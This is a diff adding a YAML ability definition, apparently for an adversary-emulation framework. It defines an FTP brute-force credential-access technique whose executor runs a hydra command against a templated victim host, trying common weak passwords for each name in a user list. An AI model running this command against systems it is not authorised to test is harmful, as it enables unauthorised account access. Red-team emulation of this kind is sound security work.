@@ -1,0 +1,35 @@
+- tactic: credential-access
+  technique_name: Brute Force
+  technique_id: T1110
+  name: Password Cracking - Brute force FTP
+  description: ''
+  executors:
+  - name: sh
+    platform: linux
+    command: hydra -L /opt/userlist -ensr ftp://#{victim.host.ip} -o /opt/ftp_user
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements:
+  - module: plugins.stockpile.app.requirements.paw_provenance
+    relationship_match:
+    - source: victim.host.ip
+      edge: ''
+      target: ''
+  privilege: ''
+  repeatable: false
+  buckets:
+  - credential-access
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: ''
+  delete_payload: true
+  id: 7375a1ec-bb40-40af-b33a-61d2b21c9f84
